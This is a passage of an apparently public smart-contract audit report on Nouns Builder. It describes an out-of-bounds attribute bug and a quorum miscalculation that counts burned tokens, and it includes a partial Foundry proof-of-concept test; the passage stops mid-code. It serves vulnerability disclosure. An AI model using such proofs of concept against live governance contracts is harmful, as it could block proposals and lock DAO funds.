class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Get the number of items to choose from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numItems</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">properties</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">items</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Use the token&#39;s seed to select an item</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">tokenAttributes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">uint16</span><span class=\"mtk1\">(</span><span class=\"mtk12\">seed</span><span class=\"mtk1\"> % </span><span class=\"mtk12\">numItems</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Adjust the randomness</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">seed</span><span class=\"mtk1\"> &gt;&gt;= </span><span class=\"mtk7\">16</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<p>The code above shows that when a token is minted and <code>onMinted</code> is called it will attempt to assign more than 16 attributes to the token which is not possible due to the <code>tokenAttributes</code> being limited to 16.</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The maximum amount of properties an owner can add should be less than the maximum amount of attributes any token can have. Consider either limiting the <code>properties</code> variable in <code>MetadataRenderer.sol</code> to 15 or allow any number of attributes to be added to a token.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523#issuecomment-1249970597\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I love that you added a coded POC.</p>\n<p>The Warden has shown how, due to a coding inconsistency, adding more than 15 properties will cause an Out-Of-Bounds error.</p>\n<p>Because this is contingent on admin configuration, I believe Medium Severity to be appropriate.</p>\n<p>Most direct solution is to explicitly limit the number of properties, otherwise the system could be rewritten to handle an unknown number of properties.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-10-the-quorum-votes-calculations-dont-take-into-account-burned-tokens\" style=\"position:relative;\"><a href=\"#m-10-the-quorum-votes-calculations-dont-take-into-account-burned-tokens\" aria-label=\"m 10 the quorum votes calculations dont take into account burned tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423\">[M-10] The quorum votes calculations don’t take into account burned tokens</a></h2>\n<p><em>Submitted by azephiar, also found by __141345__, 0x52, 0xSmartContract, bin2chen, Ch_301, indijanc, and Tointer</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524</a></p>\n<p>Because the following happens:</p>\n<ol>\n<li>Burned tokens votes are effectively deleted in <code>token._moveDelegateVotes()</code> when called by <code>token.burn()</code></li>\n<li>When an auction gets settled without bidders the function burns the token by calling <code>token.burn()</code></li>\n<li>When <code>_createAuction()</code> is called an amount of tokens >= 1 is minted, of which 1 is kept in the auction contract</li>\n<li>The functions <code>governor.proposalThreshold()</code> and <code>governor.quorum()</code> both depend on <code>token.totalSupply()</code> for their calculations.</li>\n</ol>\n<p>We can derive that the protocol calculates the <code>quorumVotes</code> taking into account burned tokens and tokens held in the auction contract, which don’t have any actual voting power. In other words the actual <code>quorumThresholdBps</code> is equal or higher than the setted <code>quorumThresholdBps</code>.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The worse case scenario that can happen is that the quorum gets so high that a proposal cannot pass even if everybody voted and everybody voted <code>for</code>, potentially locking funds into the contract.</p>\n<p>We can define:</p>\n<ol>\n<li><code>assumedVotingPower</code> = <code>token.totalSupply()</code></li>\n<li><code>realVotingPower</code> = <code>token.totalSupply() - amountOfTokensBurned</code></li>\n<li><code>ΔVotingPower</code> = <code>amountOfTokensBurned</code></li>\n</ol>\n<p>This is the case if:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">realVotingPower at proposal.voteEnd &lt; quorum at proposal.timeCreated</span></span></code></pre>\n<p>which is the same as</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">realVotingPower &lt; (assumedVotingPower * settings.quorumThresholdBps) / 10_000</span></span></code></pre>\n<p>and rearranging in terms of <code>settings.quorumThresholdBps</code> we have:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">settings.quorumThresholdBps &gt; 10_000 * realVotingPower/assumedVotingPower</span></span></code></pre>\n<p>Knowing that:</p>\n<ol>\n<li>The possible range of values for <code>10_000 * realVotingPower/assumedVotingPower</code> is from <code>1</code> to <code>10000</code>. If <code>realVotingPower = 0</code> this model doesn’t make sense in the first place.</li>\n<li>The possible range of values of <code>settings.quorumThresholdBps</code> is from <code>1</code> to <code>2^16 - 1</code>. The protocol allows for <code>settings.quorumThresholdBps</code> to be <code>0</code>, in which case it means that the actual quorum is <code>0</code>; a context in which this model doesn’t make sense. There’s another catch that restricts this boundaries, if <code>settings.quorumThresholdBps * token.totalSupply()</code> &#x3C; <code>10_000</code> the output of <code>governance.quorum()</code> would be <code>0</code>.</li>\n</ol>\n<p>Many combinations of values in the ranges described above render this disequation true, note, however, that this describes the workings in a mathematical settings and it doesnt hold true for every case in a real setting because of roundings and approximations.</p>\n<p>We can intuitevely notice that when <code>realVotingPower/assumedVotingPower</code> is very low, which is the case of a DAO with few tokens burned, the chances of the disequation being true are slim and when it’s high the chances of the disequation being true become higher. The opposite is true for <code>settings.quorumThresholdBps</code>.</p>\n<p>This might lock funds in DAOs with a lot of unsold auctions who have a low <code>settings.quorumThresholdBps</code>.</p>\n<p>At early stages this is mitigated by the fact that for every possible token burned some tokens are minted to the founders, but when the vest expires this mitigation is not in place anymore.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I wrote a test that’s expected to revert a <code>proposal.queue()</code> even if all possible votes available are cast in favor.</p>\n<p>The test comes with two parameters to set: <code>auctionsToRun</code> and <code>tokensToBidder</code>. The test runs <code>auctionsToRun</code> auctions, of which the first <code>tokensToBidder</code> are bidded upon and the rest are not. Then:</p>\n<ol>\n<li>Creates a proposal</li>\n<li>Cast all possible votes in favor</li>\n<li>Tries to queue a proposal</li>\n<li>Reverts</li>\n</ol>\n<p>The default parameters are set to <code>auctionsToRun = 130</code> and <code>tokensToBidder = 10</code>. Also <code>quorumThresholdBps = 1000</code>. This test results in <code>121 tokens burned</code> and <code>133 token minted</code>. It’s quite an unrealistic scenario, but it can get more real if <code>quorumThresholdBps</code> is setted lower. Keep in mind that this is the case in which everybody shows up to vote and averybody votes for.</p>\n<h4 id=\"test-code\" style=\"position:relative;\"><a href=\"#test-code\" aria-label=\"test code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test code</h4>\n<p>The test can be pasted inside <code>Gov.t.sol</code> and then run with:</p>\n<p><code>test -m test_RevertQueueProposalWithEverybodyInFavour</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_RevertQueueProposalWithEverybodyInFavour</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Number of auctions to run</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionsToRun</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">130</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Amount of tokens to bid up</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensToBidder</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xB1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Start the first auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unpause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Simulates an `auctionsToRun` amount of auctions in which the first `tokensForBidder` tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//are minted and then every auction ends with no bidders.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOfBurnedTokens</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">auctionsToRun</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokensToBidder</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createBid</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">0.15</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amountOfBurnedTokens</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">duration</span><span class=\"mtk1\">() + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleCurrentAndCreateNewAuction</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">founderVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">founder2Votes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bidder1Votes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">realVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">founderVotes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">founder2Votes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">bidder1Votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assumedVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">realVotingPower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assumedVotingPower</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amountOfBurnedTokens</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">auctionVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//Create mock proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">mockProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bidder1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">propose</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Amount of tokens minted: &quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Amount of tokens burned:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountOfBurnedTokens</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;---------&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;The real quorumThresholdBps is: &quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">realquorumThresholdBps</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">realVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">realquorumThresholdBps</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_string</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;The assumed quorumThresholdBps is:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assumedquorumThresholdBps</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assumedquorumThresholdBps</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span 